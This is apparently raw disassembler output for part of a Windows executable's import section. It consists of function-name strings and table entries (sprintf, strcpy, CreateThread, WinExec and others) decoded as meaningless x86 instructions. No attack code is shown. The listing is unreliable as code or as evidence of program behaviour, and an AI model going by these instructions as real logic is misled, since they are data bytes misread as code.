  41d6ec:	ds loopne 0x41d6f0
  41d6ef:	add    BYTE PTR [esi-0x20],dl
  41d6f2:	add    DWORD PTR [eax],eax
  41d6f4:	data16 loopne 0x41d6f8
  41d6f7:	add    BYTE PTR [edx-0x20],dh
  41d6fa:	add    DWORD PTR [eax],eax
  41d6fc:	xchg   al,ah
  41d6fe:	add    DWORD PTR [eax],eax
  41d700:	xchg   esp,eax
  41d701:	loopne 0x41d704
  41d703:	add    BYTE PTR [esi-0x47fffe20],ch
  41d709:	loopne 0x41d70c
  41d70b:	add    dl,cl
  41d70d:	loopne 0x41d710
  41d70f:	add    ah,bl
  41d711:	loopne 0x41d714
  41d713:	add    dh,ch
  41d715:	loopne 0x41d718
  41d717:	add    dh,bh
  41d719:	loopne 0x41d71c
  41d71b:	add    BYTE PTR [eax],cl
  41d71d:	loope  0x41d720
  41d71f:	add    BYTE PTR [esi],bl
  41d721:	loope  0x41d724
  41d723:	add    BYTE PTR [edx],dh
  41d725:	loope  0x41d728
  41d727:	add    BYTE PTR [esi-0x1f],al
  41d72a:	add    DWORD PTR [eax],eax
  41d72c:	push   esi
  41d72d:	loope  0x41d730
  41d72f:	add    BYTE PTR [esi-0x1f],ah
  41d732:	add    DWORD PTR [eax],eax
  41d734:	jb     0x41d717
  41d736:	add    DWORD PTR [eax],eax
  41d738:	test   cl,ah
  41d73a:	add    DWORD PTR [eax],eax
  41d73c:	mov    al,ds:0xb60001e1
  41d741:	loope  0x41d744
  41d743:	add    dl,al
  41d745:	loope  0x41d748
  41d747:	add    dh,dl
  41d749:	loope  0x41d74c
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	add    BYTE PTR [eax],al
  41d74f:	add    ah,dh
  41d751:	loope  0x41d754
  41d753:	add    BYTE PTR [edx+eiz*8],al
  41d756:	add    DWORD PTR [eax],eax
  41d758:	adc    al,0xe2
  41d75a:	add    DWORD PTR [eax],eax
  41d75c:	and    ah,dl
  41d75e:	add    DWORD PTR [eax],eax
  41d760:	xor    dl,ah
  41d762:	add    DWORD PTR [eax],eax
  41d764:	ds loop 0x41d768
  41d767:	add    BYTE PTR [edx-0x1e],dl
  41d76a:	add    DWORD PTR [eax],eax
  41d76c:	pusha  
  41d76d:	loop   0x41d770
  41d76f:	add    BYTE PTR [edx-0x1e],bh
  41d772:	add    DWORD PTR [eax],eax
  41d774:	xchg   dl,ah
  41d776:	add    DWORD PTR [eax],eax
  41d778:	cwde   
  41d779:	loop   0x41d77c
  41d77b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d782:	add    DWORD PTR [eax],eax
  41d784:	int3   
  41d785:	loop   0x41d788
  41d787:	add    dh,dl
  41d789:	loop   0x41d78c
  41d78b:	add    al,ah
  41d78d:	loop   0x41d790
  41d78f:	add    dl,bh
  41d791:	loop   0x41d794
  41d793:	add    BYTE PTR [edx],cl
  41d795:	jecxz  0x41d798
  41d797:	add    BYTE PTR [edx],bl
  41d799:	jecxz  0x41d79c
  41d79b:	add    BYTE PTR [ebx+eiz*8],ah
  41d79e:	add    DWORD PTR [eax],eax
  41d7a0:	xor    al,0xe3
  41d7a2:	add    DWORD PTR [eax],eax
  41d7a4:	inc    eax
  41d7a5:	jecxz  0x41d7a8
  41d7a7:	add    BYTE PTR [esi-0x1d],cl
  41d7aa:	add    DWORD PTR [eax],eax
  41d7ac:	fs jecxz 0x41d7b0
  41d7af:	add    BYTE PTR [esi-0x1d],dh
  41d7b2:	add    DWORD PTR [eax],eax
  41d7b4:	mov    fs,ebx
  41d7b6:	add    DWORD PTR [eax],eax
  41d7b8:	mov    ds:0xb00001e3,al
  41d7bd:	jecxz  0x41d7c0
  41d7bf:	add    dl,al
  41d7c1:	jecxz  0x41d7c4
  41d7c3:	add    dh,cl
  41d7c5:	jecxz  0x41d7c8
  41d7c7:	add    dh,bl
  41d7c9:	jecxz  0x41d7cc
  41d7cb:	add    ah,ch
  41d7cd:	jecxz  0x41d7d0
  41d7cf:	add    BYTE PTR [eax],al
  41d7d1:	in     al,0x1
  41d7d3:	add    BYTE PTR [esi],cl
  41d7d5:	in     al,0x1
  41d7d7:	add    BYTE PTR [edx],ch
  41d7d9:	in     al,0x1
  41d7db:	add    BYTE PTR [esp+eiz*8],bh
  41d7de:	add    DWORD PTR [eax],eax
  41d7e0:	dec    esp
  41d7e1:	in     al,0x1
  41d7e3:	add    BYTE PTR [esi-0x1c],bl
  41d7e6:	add    DWORD PTR [eax],eax
  41d7e8:	push   0xffffffe4
  41d7ea:	add    DWORD PTR [eax],eax
  41d7ec:	jl     0x41d7d2
  41d7ee:	add    DWORD PTR [eax],eax
  41d7f0:	mov    ah,ah
  41d7f2:	add    DWORD PTR [eax],eax
  41d7f4:	cwde   
  41d7f5:	in     al,0x1
  41d7f7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d7fd:	in     al,0x1
  41d7ff:	add    al,dl
  41d801:	in     al,0x1
  41d803:	add    dl,ah
  41d805:	in     al,0x1
  41d807:	add    al,dh
  41d809:	in     al,0x1
  41d80b:	add    BYTE PTR [eax],cl
  41d80d:	in     eax,0x1
  41d80f:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d816:	add    DWORD PTR [eax],eax
  41d818:	ds in  eax,0x1
  41d81b:	add    BYTE PTR [edx-0x1b],cl
  41d81e:	add    DWORD PTR [eax],eax
  41d820:	pop    edx
  41d821:	in     eax,0x1
  41d823:	add    BYTE PTR [esi-0x1b],ch
  41d826:	add    DWORD PTR [eax],eax
  41d828:	jle    0x41d80f
  41d82a:	add    DWORD PTR [eax],eax
  41d82c:	nop
  41d82d:	in     eax,0x1
  41d82f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d836:	add    DWORD PTR [eax],eax
  41d838:	mov    eax,0xca0001e5
  41d83d:	in     eax,0x1
  41d83f:	add    dl,bl
  41d841:	in     eax,0x1
  41d843:	add    dh,ah
  41d845:	in     eax,0x1
  41d847:	add    ah,bh
  41d849:	in     eax,0x1
  41d84b:	add    BYTE PTR [esi],cl
  41d84d:	out    0x1,al
  41d84f:	add    BYTE PTR [eax],ch
  41d851:	out    0x1,al
  41d853:	add    BYTE PTR [edx],bh
  41d855:	out    0x1,al
  41d857:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d85b:	add    BYTE PTR [eax-0x1a],bl
  41d85e:	add    DWORD PTR [eax],eax
  41d860:	push   0x7a0001e6
  41d865:	out    0x1,al
  41d867:	add    BYTE PTR [esi-0x67fffe1a],al
  41d86d:	out    0x1,al
  41d86f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d875:	out    0x1,al
  41d877:	add    ah,bl
  41d879:	out    0x1,al
  41d87b:	add    dl,ch
  41d87d:	out    0x1,al
  41d87f:	add    al,bh
  41d881:	out    0x1,al
  41d883:	add    BYTE PTR [esi],cl
  41d885:	out    0x1,eax
  41d887:	add    BYTE PTR [esi],bl
  41d889:	out    0x1,eax
  41d88b:	add    BYTE PTR [edx],ch
  41d88d:	out    0x1,eax
  41d88f:	add    BYTE PTR [edx],bh
  41d891:	out    0x1,eax
  41d893:	add    BYTE PTR [edx-0x19],cl
  41d896:	add    DWORD PTR [eax],eax
  41d898:	pop    esp
  41d899:	out    0x1,eax
  41d89b:	add    BYTE PTR [eax-0x19],ch
  41d89e:	add    DWORD PTR [eax],eax
  41d8a0:	jbe    0x41d889
  41d8a2:	add    DWORD PTR [eax],eax
  41d8a4:	xchg   bh,ah
  41d8a6:	add    DWORD PTR [eax],eax
  41d8a8:	cwde   
  41d8a9:	out    0x1,eax
  41d8ab:	add    BYTE PTR [eax-0x45fffe19],ch
  41d8b1:	out    0x1,eax
  41d8b3:	add    al,dl
  41d8b5:	out    0x1,eax
  41d8b7:	add    dh,ah
  41d8b9:	out    0x1,eax
  41d8bb:	add    dh,dh
  41d8bd:	out    0x1,eax
  41d8bf:	add    BYTE PTR [edx],al
  41d8c1:	call   0xe859d8c7
  41d8c6:	add    DWORD PTR [eax],eax
  41d8c8:	and    al,0xe8
  41d8ca:	add    DWORD PTR [eax],eax
  41d8cc:	xor    al,0xe8
  41d8ce:	add    DWORD PTR [eax],eax
  41d8d0:	dec    eax
  41d8d1:	call   0xe897d8d7
  41d8d6:	add    DWORD PTR [eax],eax
  41d8d8:	callw  0xd8dd
  41d8dc:	jp     0x41d8c6
  41d8de:	add    DWORD PTR [eax],eax
  41d8e0:	xchg   al,ch
  41d8e2:	add    DWORD PTR [eax],eax
  41d8e4:	xchg   esi,eax
  41d8e5:	call   0xe8e3d8eb
  41d8ea:	add    DWORD PTR [eax],eax
  41d8ec:	mov    dl,0xe8
  41d8ee:	add    DWORD PTR [eax],eax
  41d8f0:	(bad)  
  41d8f1:	call   0xe913d8f7
  41d8f6:	add    DWORD PTR [eax],eax
  41d8f8:	in     al,0xe8
  41d8fa:	add    DWORD PTR [eax],eax
  41d8fc:	lock call 0xe93fd903
  41d902:	add    DWORD PTR [eax],eax
  41d904:	or     al,0xe9
  41d906:	add    DWORD PTR [eax],eax
  41d908:	sbb    ch,cl
  41d90a:	add    DWORD PTR [eax],eax
  41d90c:	add    BYTE PTR [eax],al
  41d90e:	add    BYTE PTR [eax],al
  41d910:	or     al,0x2
  41d912:	add    BYTE PTR [eax+0x0],al
  41d918:	cmc    
  41d919:	add    BYTE PTR [edi+0x63],bl
  41d91c:	outs   dx,DWORD PTR ds:[esi]
  41d91d:	outs   dx,BYTE PTR ds:[esi]
  41d91e:	je     0x41d992
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	ins    BYTE PTR es:[edi],dx
  41d922:	data16 jo 0x41d925
  41d925:	add    BYTE PTR [ebx],al
  41d927:	add    al,0x73
  41d929:	jns    0x41d99e
  41d92b:	je     0x41d992
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	add    BYTE PTR [eax],al
  41d930:	fwait
  41d931:	add    ebp,DWORD PTR [ecx+0x73]
  41d934:	jo     0x41d9a8
  41d936:	imul   ebp,DWORD PTR [esi+0x74],0x61035a00
  41d93d:	je     0x41d9ae
  41d93f:	ins    BYTE PTR es:[edi],dx
  41d940:	add    BYTE PTR [eax],al
  41d942:	jmp    0x7363:0x72747303
  41d949:	jo     0x41d9b9
  41d94b:	add    BYTE PTR [edi+0x73626d03],dh
  41d951:	je     0x41d9c2
  41d953:	ja     0x41d9b8
  41d955:	jae    0x41d957
  41d957:	add    bh,ah
  41d959:	add    esi,DWORD PTR [ebx+0x74]
  41d95c:	jb     0x41d9c1
  41d95e:	outs   dx,DWORD PTR ds:[esi]
  41d95f:	ins    BYTE PTR es:[edi],dx
  41d960:	ins    BYTE PTR es:[edi],dx
  41d961:	add    ch,al
  41d963:	add    esi,DWORD PTR [eax+0x72]
  41d966:	imul   ebp,DWORD PTR [esi+0x74],0xb000066
  41d96d:	add    al,0x74
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	ja     0x41d9de
  41d972:	outs   dx,DWORD PTR ds:[esi]
  41d973:	ja     0x41d9da
  41d975:	jb     0x41d977
  41d977:	add    BYTE PTR [esi],al
  41d979:	add    al,0x74
  41d97b:	imul   ebp,DWORD PTR [ebp+0x65],0x36d0000
  41d982:	data16 addr16 gs je 0x41d9ea
  41d987:	add    BYTE PTR [ebx+0x735f5f00],dh
  41d98d:	gs je  0x41d9ef
  41d990:	popa   
  41d991:	jo     0x41da03
  41d993:	pop    edi
  41d994:	je     0x41da0f
  41d996:	jo     0x41d9fd
  41d998:	add    BYTE PTR [eax],al
  41d99a:	mov    al,ds:0x705f5f00
  41d99f:	pop    edi
  41d9a0:	pop    edi
  41d9a1:	ins    WORD PTR es:[edi],dx
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	fs add BYTE PTR gs:[eax],al
  41d9a8:	xchg   esp,eax
  41d9a9:	add    ebp,DWORD PTR [ecx+0x73]
  41d9ac:	popa   
  41d9ad:	ins    BYTE PTR es:[edi],dx
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	jne    0x41da1e
  41d9b1:	add    dl,bh
  41d9b3:	add    esi,DWORD PTR [ebx+0x74]
  41d9b6:	jb     0x41da2c
  41d9b8:	outs   dx,DWORD PTR ds:[esi]
  41d9b9:	imul   eax,DWORD PTR [eax],0x0
  41d9bc:	sbb    al,0x4
  41d9be:	ja     0x41da23
  41d9c0:	jae    0x41da25
  41d9c2:	popa   
  41d9c3:	je     0x41d9c5
  41d9c5:	add    BYTE PTR [ecx+0x74626d03],bh
  41d9cb:	outs   dx,DWORD PTR ds:[esi]
  41d9cc:	ja     0x41da31
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	fwait
  41d9d1:	add    BYTE PTR [edi+0x5f],bl
  41d9d4:	jo     0x41da35
  41d9d6:	pop    edi
  41d9d7:	arpl   WORD PTR [edi+0x6d],bp
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fs add BYTE PTR gs:[eax],al
  41d9e0:	loope  0x41d9e5
  41d9e2:	jae    0x41da57
  41d9e4:	arpl   WORD PTR [ecx+0x6e],sp
  41d9e7:	data16 add BYTE PTR [eax],al
  41d9ea:	fild   DWORD PTR [eax]
  41d9ec:	pop    edi
  41d9ed:	popa   
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jae    0x41da58
  41d9f1:	pop    edi
  41d9f2:	gs js  0x41da5e
  41d9f5:	je     0x41d9f7
  41d9f7:	add    BYTE PTR [esi+0x6e695f01],al
  41d9fd:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xc8006d72
  41da05:	add    esi,DWORD PTR [eax+0x75]
  41da08:	je     0x41da6d
  41da0a:	push   0xb1007261
  41da0f:	add    ebp,DWORD PTR [edi+ebp*2+0x63]
  41da13:	popa   
  41da14:	ins    BYTE PTR es:[edi],dx
  41da15:	je     0x41da80
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	add    BYTE PTR gs:[ecx+0x3],ch
  41da1c:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  41da21:	add    BYTE PTR gs:[eax],al
  41da24:	or     eax,0x676e7504
  41da29:	gs je  0x41da8f
  41da2c:	add    BYTE PTR [eax],al
  41da2e:	sub    DWORD PTR [edi+esi*2],eax
  41da31:	arpl   WORD PTR [ebx+0x6e],si
  41da34:	arpl   WORD PTR [eax+0x79],si
  41da37:	add    bh,cl
  41da39:	add    esi,DWORD PTR [edx+0x61]
  41da3c:	outs   dx,BYTE PTR ds:[esi]
  41da3d:	add    BYTE PTR fs:[eax],al
  41da40:	sahf   
  41da41:	add    DWORD PTR [edi+0x69],ebx
  41da44:	jae    0x41dab3
  41da46:	bound  esp,QWORD PTR [edx+0x6c]
  41da49:	gs popa 
  41da4b:	add    BYTE PTR fs:[eax],al
  41da4e:	add    DWORD PTR [ebx+esi*2],eax
  41da51:	ja     0x41dac6
  41da53:	arpl   WORD PTR [ecx+0x6e],sp
  41da56:	data16 add BYTE PTR [ebx+0x77736903],ch
  41da5d:	js     0x41dac3
  41da5f:	imul   esp,DWORD PTR [edi+0x69],0x4280074
  41da66:	ja     0x41dacb
  41da68:	jae    0x41dad8
  41da6a:	arpl   WORD PTR [ebp+0x70],bp
  41da6d:	add    BYTE PTR [esi+0x75736903],bl
  41da73:	jo     0x41dae5
  41da75:	gs jb  0x41da78
  41da78:	push   edx
  41da79:	add    BYTE PTR [edi+0x58],bl
  41da7c:	arpl   WORD PTR [eax+0x74],si
  41da7f:	inc    esi
  41da80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  41da88:	pop    edi
  41da89:	gs js  0x41daf5
  41da8c:	je     0x41da8e
  41da8e:	sbb    BYTE PTR [esi+esi*2],al
  41da91:	jae    0x41db0a
  41da93:	jo     0x41db07
  41da95:	imul   ebp,DWORD PTR [esi+0x74],0xe80066
  41da9c:	pop    edi
  41da9d:	arpl   WORD PTR [ebp+0x78],sp
  41daa0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x7362035b
  41daa8:	gs popa 
  41daaa:	jb     0x41db0f
  41daac:	push   0x7303e800
  41dab1:	je     0x41db25
  41dab3:	arpl   WORD PTR [eax+0x79],si
  41dab6:	add    BYTE PTR [eax],al
  41dab8:	mov    ch,0x0
  41daba:	pop    edi
  41dabb:	pop    edi
  41dabc:	jae    0x41db23
  41dabe:	je     0x41db35
  41dac0:	jae    0x41db27
  41dac2:	jb     0x41db31
  41dac4:	popa   
  41dac5:	je     0x41db2f
  41dac7:	gs jb  0x41db3c
  41daca:	add    BYTE PTR [eax],al
  41dacc:	jb     0x41dace
  41dace:	pop    edi
  41dacf:	pop    edi
  41dad0:	addr16 gs je 0x41db41
  41dad4:	popa   
  41dad5:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  41dadc:	pop    edi
  41dadd:	add    esp,DWORD PTR [ebx+0x6c]
  41dae0:	gs popa 
  41dae2:	jb     0x41db49
  41dae4:	jb     0x41db58
  41dae6:	add    BYTE PTR [eax],al
  41dae8:	and    DWORD PTR [edi+esi*2],eax
  41daeb:	arpl   WORD PTR [ebx+0x63],si
  41daee:	jo     0x41db69
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	std    
  41daf3:	add    esi,DWORD PTR [ebx+0x74]
  41daf6:	jb     0x41db6c
  41daf8:	outs   dx,DWORD PTR ds:[esi]
  41daf9:	jne    0x41db67
  41dafb:	add    bl,al
  41dafd:	add    esi,DWORD PTR [eax+0x65]
  41db00:	jb     0x41db74
  41db02:	outs   dx,DWORD PTR ds:[esi]
  41db03:	jb     0x41db05
  41db05:	add    BYTE PTR [ebp+0x53],cl
  41db08:	push   esi
  41db09:	inc    ebx
  41db0a:	push   edx
  41db0b:	push   esp
  41db0c:	cs fs ins BYTE PTR es:[edi],dx
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	add    BYTE PTR [eax],al
  41db12:	inc    ecx
  41db13:	add    al,0x53
  41db15:	gs je  0x41db6d
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   0x6c646e61
  41db1e:	gs fs inc ebp
  41db21:	js     0x41db86
  41db23:	gs jo  0x41db9a
  41db26:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  41db2d:	gs jb  0x41db30
  41db30:	jmp    0x6946:0x74654701
  41db37:	ins    BYTE PTR es:[edi],dx
  41db38:	gs inc ecx
  41db3a:	je     0x41dbb0
  41db3c:	jb     0x41dba7
  41db3e:	bound  esi,QWORD PTR [ebp+0x74]
  41db41:	gs jae 0x41db89
  41db44:	js     0x41db87
  41db46:	add    BYTE PTR [eax],al
  41db48:	pop    esp
  41db49:	add    DWORD PTR [esi+0x69],eax
  41db4c:	outs   dx,BYTE PTR ds:[esi]
  41db4d:	fs inc esi
  41db4f:	imul   esi,DWORD PTR [edx+0x73],0x61684374
  41db56:	outs   dx,BYTE PTR ds:[esi]
  41db57:	addr16 gs dec esi
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	je     0x41dbc6
  41db5d:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41db63:	outs   dx,DWORD PTR ds:[esi]
  41db64:	outs   dx,BYTE PTR ds:[esi]
  41db65:	push   edi
  41db66:	add    BYTE PTR [eax],al
  41db68:	mov    ds:0x6c614300,al
  41db6d:	ins    BYTE PTR es:[edi],dx
  41db6e:	dec    esi
  41db6f:	popa   
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	gs fs push eax
  41db74:	imul   esi,DWORD PTR [eax+0x65],0xdb000057
  41db7b:	add    cl,BYTE PTR [ecx+0x73]
  41db7e:	push   esi
  41db7f:	popa   
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  41db89:	add    BYTE PTR [ebp+0x1],ah
  41db8c:	inc    esi
  41db8d:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  41db94:	inc    ebx
  41db95:	push   0x65676e61
  41db9a:	dec    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	je     0x41dc07
  41db9e:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41dba4:	outs   dx,DWORD PTR ds:[esi]
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	add    BYTE PTR [eax],al
  41dba8:	cmp    BYTE PTR [ebx+edx*2],al
  41dbab:	gs je  0x41dc02
  41dbae:	push   0x64616572
  41dbb3:	inc    ebp
  41dbb4:	js     0x41dc1b
  41dbb6:	arpl   WORD PTR [ebp+0x74],si
  41dbb9:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  41dbc0:	add    BYTE PTR gs:[esi],bl
  41dbc3:	add    al,BYTE PTR [edi+0x65]
  41dbc6:	je     0x41dc18
  41dbc8:	jb     0x41dc33
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	jb     0x41dc36
  41dbcd:	je     0x41dc48
  41dbcf:	inc    ebx
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	popa   
  41dbd2:	jae    0x41dc47
  41dbd4:	add    BYTE PTR [eax],al
  41dbd6:	add    DWORD PTR [bp+0x69],eax
  41dbda:	outs   dx,BYTE PTR ds:[esi]
  41dbdb:	fs dec esi
  41dbdd:	gs js  0x41dc54
  41dbe0:	inc    esi
  41dbe1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x57048d00
  41dbe9:	popa   
  41dbea:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41dbf2:	je     0x41dc5d
  41dbf4:	jo     0x41dc62
  41dbf6:	gs dec edi
  41dbf8:	bound  ebp,QWORD PTR [edx+0x65]
  41dbfb:	arpl   WORD PTR [ebx+esi*2+0x45],si
  41dbff:	js     0x41dc01
  41dc01:	add    BYTE PTR [edi],ah
  41dc03:	add    al,0x53
  41dc05:	gs je  0x41dc56
  41dc08:	popa   
  41dc09:	ins    DWORD PTR es:[edi],dx
  41dc0a:	gs fs push eax
  41dc0d:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	gs push ebx
  41dc17:	je     0x41dc7a
  41dc19:	je     0x41dc80
  41dc1b:	add    bl,bh
  41dc1d:	add    DWORD PTR [edi+0x65],eax
  41dc20:	je     0x41dc6e
  41dc22:	popa   
  41dc23:	jae    0x41dc99
  41dc25:	inc    ebp
  41dc26:	jb     0x41dc9a
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	jb     0x41dc2b
  41dc2b:	add    BYTE PTR [eax+0x6f6c4702],dl
  41dc31:	bound  esp,QWORD PTR [ecx+0x6c]
  41dc34:	inc    esi
  41dc35:	jb     0x41dc9c
  41dc37:	add    BYTE PTR gs:[eax],al
  41dc3a:	or     al,BYTE PTR [edx]
  41dc3c:	inc    edi
  41dc3d:	gs je  0x41dc8d
  41dc40:	outs   dx,DWORD PTR ds:[esi]
  41dc41:	fs jne 0x41dcb0
  41dc44:	gs dec eax
  41dc46:	popa   
  41dc47:	outs   dx,BYTE PTR ds:[esi]
  41dc48:	fs ins BYTE PTR es:[edi],dx
  41dc4a:	gs inc ecx
  41dc4c:	add    BYTE PTR [eax],al
  41dc4e:	js     0x41dc53
  41dc50:	push   edx
  41dc51:	gs popa 
  41dc53:	fs inc esi
  41dc55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47019000
  41dc5d:	gs je  0x41dca3
  41dc60:	push   eax
  41dc61:	dec    ecx
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	outs   dx,WORD PTR ds:[esi]
  41dc65:	add    BYTE PTR ds:0x74655304,ah
  41dc6b:	dec    ebp
  41dc6c:	popa   
  41dc6d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41dc75:	outs   dx,WORD PTR ds:[esi]
  41dc77:	add    dh,bh
  41dc79:	add    DWORD PTR [edi+0x65],eax
  41dc7c:	je     0x41dcca
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	arpl   WORD PTR [ecx+0x6c],sp
  41dc82:	gs dec ecx
  41dc84:	outs   dx,BYTE PTR ds:[esi]
  41dc85:	outs   dx,WORD PTR ds:[esi]
  41dc87:	inc    ecx
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	push   es
  41dc8b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41dc8f:	fs dec esp
  41dc91:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  41dc98:	js     0x41dcdb
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	add    al,BYTE PTR [edi+0x65]
  41dca0:	je     0x41dcf6
  41dca2:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41dca9:	popa   
  41dcaa:	je     0x41dced
  41dcac:	add    BYTE PTR [eax],al
  41dcae:	inc    DWORD PTR [ecx]
  41dcb0:	inc    edi
  41dcb1:	gs je  0x41dd00
  41dcb4:	outs   dx,DWORD PTR ds:[esi]
  41dcb5:	arpl   WORD PTR [ecx+0x6c],sp
  41dcb8:	gs dec ecx
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	outs   dx,WORD PTR ds:[esi]
  41dcbd:	push   edi
  41dcbe:	add    BYTE PTR [eax],al
  41dcc0:	rol    BYTE PTR [esp+ebp*2],0x73
  41dcc4:	je     0x41dd38
  41dcc6:	arpl   WORD PTR [ecx+0x74],sp
  41dcc9:	push   edi
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	repnz add DWORD PTR [edi+0x65],eax
  41dcd0:	je     0x41dd18
  41dcd2:	jne    0x41dd40
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	push   eax
  41dcd6:	popa   
  41dcd7:	je     0x41dd41
  41dcd9:	dec    esi
  41dcda:	popa   
  41dcdb:	ins    DWORD PTR es:[edi],dx
  41dcdc:	gs inc ecx
  41dcde:	add    BYTE PTR [eax],al
  41dce0:	cmp    al,0x3
  41dce2:	dec    edi
  41dce3:	jo     0x41dd4a
  41dce5:	outs   dx,BYTE PTR ds:[esi]
  41dce6:	inc    esi
  41dce7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	addr16 push edi
  41dcf2:	add    BYTE PTR [eax],al
  41dcf4:	stc    
  41dcf5:	add    cl,BYTE PTR [ecx+0x73]
  41dcf8:	inc    edx
  41dcf9:	popa   
  41dcfa:	fs push ebx
  41dcfc:	je     0x41dd70
  41dcfe:	imul   ebp,DWORD PTR [esi+0x67],0x57727450
  41dd05:	add    dl,cl
  41dd07:	add    BYTE PTR [ebx+0x72],al
  41dd0a:	gs popa 
  41dd0c:	je     0x41dd73
  41dd0e:	inc    ebp
  41dd0f:	jbe    0x41dd76
  41dd11:	outs   dx,BYTE PTR ds:[esi]
  41dd12:	je     0x41dd55
  41dd14:	add    BYTE PTR [eax],al
  41dd16:	ins    DWORD PTR es:[edi],dx
  41dd17:	add    al,0x55
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	ins    BYTE PTR es:[edi],dx
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	arpl   WORD PTR [ebx+0x46],bp
  41dd1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x45011300
  41dd27:	outs   dx,BYTE PTR ds:[esi]
  41dd28:	je     0x41dd8f
  41dd2a:	jb     0x41dd6f
  41dd2c:	jb     0x41dd97
  41dd2e:	je     0x41dd99
  41dd30:	arpl   WORD PTR [ecx+0x6c],sp
  41dd33:	push   ebx
  41dd34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41dd39:	outs   dx,BYTE PTR ds:[esi]
  41dd3a:	add    BYTE PTR [eax],al
  41dd3c:	pop    edi
  41dd3d:	add    al,0x54
  41dd3f:	ins    BYTE PTR es:[edi],dx
  41dd40:	jae    0x41dd89
  41dd42:	gs je  0x41dd9b
  41dd45:	popa   
  41dd46:	ins    BYTE PTR es:[edi],dx
  41dd47:	jne    0x41ddae
  41dd49:	add    BYTE PTR [ebx+0x61654802],ah
  41dd4f:	jo     0x41dd94
  41dd51:	jb     0x41ddb8
  41dd53:	popa   
  41dd54:	je     0x41ddbb
  41dd56:	add    BYTE PTR [eax],al
  41dd58:	dec    ebp
  41dd59:	add    al,0x53
  41dd5b:	ins    BYTE PTR es:[edi],dx
  41dd5c:	gs gs jo 0x41dd60
  41dd60:	jnp    0x41dd63
  41dd62:	inc    esi
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	ins    BYTE PTR es:[edi],dx
  41dd65:	fs push ebx
  41dd67:	je     0x41dddb
  41dd69:	imul   ebp,DWORD PTR [esi+0x67],0x47a0057
  41dd70:	push   esi
  41dd71:	gs jb  0x41ddc7
  41dd74:	gs je  0x41ddba
  41dd77:	outs   dx,DWORD PTR ds:[esi]
  41dd78:	outs   dx,BYTE PTR ds:[esi]
  41dd79:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  41dd82:	imul   eax,DWORD PTR [eax],0xffffff94
  41dd85:	add    al,0x57
  41dd87:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  41dd8e:	in     eax,dx
  41dd8f:	add    BYTE PTR [ebx+0x72],al
  41dd92:	gs popa 
  41dd94:	je     0x41ddfb
  41dd96:	push   esp
  41dd97:	push   0x64616572
  41dd9c:	add    BYTE PTR [eax],al
  41dd9e:	rol    BYTE PTR [eax],cl
  41dda0:	inc    ebx
  41dda1:	jb     0x41de08
  41dda3:	popa   
